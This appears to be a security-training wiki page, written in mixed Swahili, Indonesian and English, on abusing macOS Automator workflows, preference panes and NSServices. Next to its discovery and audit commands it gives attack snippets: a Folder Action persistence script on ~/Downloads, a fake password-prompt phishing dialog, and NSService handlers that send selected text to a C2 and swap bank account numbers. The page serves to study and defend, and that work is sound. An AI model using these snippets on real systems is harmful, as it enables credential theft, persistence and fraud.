# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** ni zana ya kuona ya uautomishaji ya macOS. Hutekeleza **workflows** (`.workflow` bundles) zinazojumuisha **actions** (`.action` bundles). Automator pia huendesha ujumuishaji wa **Folder Actions**, **Quick Actions**, na **Shortcuts**. Kwenye macOS za kisasa, workflows pia zinaweza **kuingizwa ndani ya Shortcuts**, hivyo mantiki ileile hasidi inaweza kuonekana kama Finder Quick Action, user service chini ya `~/Library/Services/`, au shortcut inayotegemea legacy Automator actions.

Automator actions ni **plugins** zinazopakiwa ndani ya Automator runtime wakati workflow inatekelezwa. Zinaweza:
- Kutekeleza shell scripts za kiholela
- Kuchakata faili na data
- Kuwasiliana na applications kupitia AppleScript
- Kuunganishwa pamoja kwa automation changamano

### Kwa Nini Hii Ni Muhimu

> [!WARNING]
> Automator workflows zinaweza **kuingizwa kwa social engineering** ili zitekelezwe — huonekana kama faili rahisi za hati. `.workflow` bundle inaweza kuwa na shell commands zilizopachikwa ambazo hutekelezwa wakati workflow inapoendeshwa. Zikiunganishwa na Folder Actions, zinatoa **persistence ya kiotomatiki** inayochochewa na file events. Marekebisho ya hivi karibuni ya Gatekeeper pia yalionyesha kuwa **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) lazima zitibiwe kama content inayoweza kutekelezwa, si data isiyo na madhara.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Shambulio: Social-Engineered Workflow

Kifurushi cha `.workflow` kinaonekana kama faili la kawaida la hati kwa watumiaji wengi:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Shambulio: Uendelevu wa Folder Action

Folder Actions hutekeleza kiotomatiki workflow wakati faili zinaongezwa kwenye folda inayofuatiliwa:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions hubaki katika reboot na hutekeleza kimya kimya. Folder Action kwenye `~/Downloads` inamaanisha **kila faili iliyopakuliwa huchochea payload yako** — ikijumuisha faili kutoka Safari, Chrome, AirDrop, na viambatisho vya barua pepe. Pia kumbuka kuwa `System Events` inaweza kusajili Folder Actions zinazoelekeza kwenye scripts nje ya maeneo ya kawaida ya `~/Library/Scripts/Folder Action Scripts`, jambo linalofanya utafutaji wa loose-path uwe wa maana. Kwa athari zinazohusiana na TCC, angalia [the TCC page](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) ni plugins zinazopakiwa kutoka **System Settings** (zamani System Preferences). Hutoa panels za UI za usanidi kwa vipengele vya mfumo au vya wahusika wengine. Kwenye mifumo ya zamani zilipakiwa moja kwa moja na `System Preferences`; kwenye matoleo mapya panes za wahusika wengine kwa kawaida hupitishwa kupitia **legacy loader XPC service** iliyoanzishwa kutoka System Settings.

### Why This Matters

- Preference panes hutekelezwa ndani ya **trusted host process** iliyoanzishwa na System Settings / System Preferences
- Kwenye mifumo ya kisasa host hiyo inaweza kuwa **`legacyLoader` XPC service**, hivyo mpaka muhimu bado ni **trusted Apple UI process -> third-party code loading**
- Preference panes za wahusika wengine hurithi **host process security context** na imani ya mtumiaji iliyoambatishwa kwenye UI hiyo
- Watumiaji husakinisha preference panes kwa **kuzibofya mara mbili** — social engineering rahisi
- Mara zikiwekwa, **hubaki** na hupakiwa kila mara System Settings inapofungua panel hiyo

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Shambulizi: Privilege Context Hijacking

A malicious preference pane hurithi security context ya **pane host** (kihistoria `System Preferences`, kwenye matoleo mapya mara nyingi `legacyLoader` helper iliyozinduliwa na `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Shambulio: Persistence kupitia Ufungaji
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Shambulio: UI Phishing

Kipengele cha preference pane kinaweza kuiga paneli halali za mfumo wa UI ili **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Informasi Dasar

**NSServices** memungkinkan aplikasi menyediakan fungsionalitas ke aplikasi lain melalui **Services menu** (right-click → Services). Ketika pengguna memilih teks atau data dan menjalankan service, data yang dipilih **dikirim ke service provider** untuk diproses.

Services dideklarasikan dalam `Info.plist` aplikasi di bawah key `NSServices` dan didaftarkan dengan pasteboard server (`pbs`). macOS juga menyimpan **service cache** dan **restriction policy** yang menentukan service mana yang terlihat dan apakah caller yang sandboxed harus menerima peringatan tambahan.

### Mengapa Ini Penting

- Services menerima **cross-application data flow** — teks yang dipilih dari aplikasi mana pun dikirim ke service
- Sebuah service berbahaya menangkap data dari password manager, email client, aplikasi keuangan
- Services dapat **mengembalikan data yang dimodifikasi** ke aplikasi pemanggil (man-in-the-middle pada operasi seleksi)
- Nama service dapat dibuat agar terlihat sah ("Format Text", "Encrypt Selection", "Share")
- Flag opsional `NSRestricted` relevan untuk keamanan: service yang ditandai unrestricted dapat dipanggil oleh aplikasi sandboxed tanpa peringatan yang ditampilkan macOS untuk service yang berisiko escape

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Shambulio: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Shambulizi: Urekebishaji wa Data (Man-in-the-Middle)

Huduma inaweza **kurekebisha data iliyorejeshwa** huku ikionekana kutoa kazi halali:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple inaunga mkono `NSRestricted` ya hiari ya boolean kwa kila ufafanuzi wa service. Ikiwa imewekwa, macOS huonya callers walioko sandbox kwa sababu service inaweza kuwasaidia **kutoka sandbox au mipaka ya privacy**. Kutoka kwa mtazamo wa offensive, hili linatoa njia mbili muhimu za audit:

- Tafuta **third-party services ambazo hazijawekwa kuwa restricted** ingawa zinapitisha Apple Events, file access, au actions nyingine zenye privileges
- Tafuta **high-value built-in services** zenye entitlements kali (kwa mfano, services zinazoonekana kupitia Script Editor au helpers zinazotegemea Finder) na uangalie kama user interaction inatosha kuzibadilisha kuwa data-access primitive

Mfano mzuri wa hivi karibuni ni **CVE-2022-48574**, ambapo mechanism ya Services ingeweza kutumiwa vibaya kufikia **TCC-protected user files bila confirmation flow inayotarajiwa**. Bug hii imerekebishwa, lakini technique bado ni muhimu kwa threat modeling: service yoyote inayopitisha file access au automation requests kwa niaba ya caller inastahili uchunguzi huo huo.

---

## Recent Security Notes

- **Quick Actions are executable content**: Apple ilirekebisha Gatekeeper bypass mnamo 2024 ambapo app-bundled Automator Quick Action ingeweza kuendeshwa bila assessment ya kawaida. Unapoaudit apps, kagua `Contents/PlugIns/*.workflow/Contents/document.wflow` kwa usahihi kama ambavyo ungekagua helper scripts au login items. Tazama [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts can inherit legacy Automator behavior**: Apple pia iliongeza user-consent prompt ya ziada baada ya third-party shortcuts kupatikana zikitumia **legacy Automator action** kutuma Apple Events bila permission flow inayotarajiwa. Imported workflows na shortcut bundles zinapaswa kukaguliwa kwa `Run AppleScript`, `Run Shell Script`, na bridge actions zinazofanana. Tazama [the TCC page](../macos-security-protections/macos-tcc/README.md).
- **Automator is still a live privacy boundary**: Apple ilitoa nyingine Automator fix mnamo 2025 kwa access to protected user data. Hata kama Automator ni legacy surface, chukulia workflow runner yoyote, Quick Action host, au automation bridge kama current attack surface badala ya dead code.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Wizi wa Meneja wa Nenosiri
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Marejeo

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
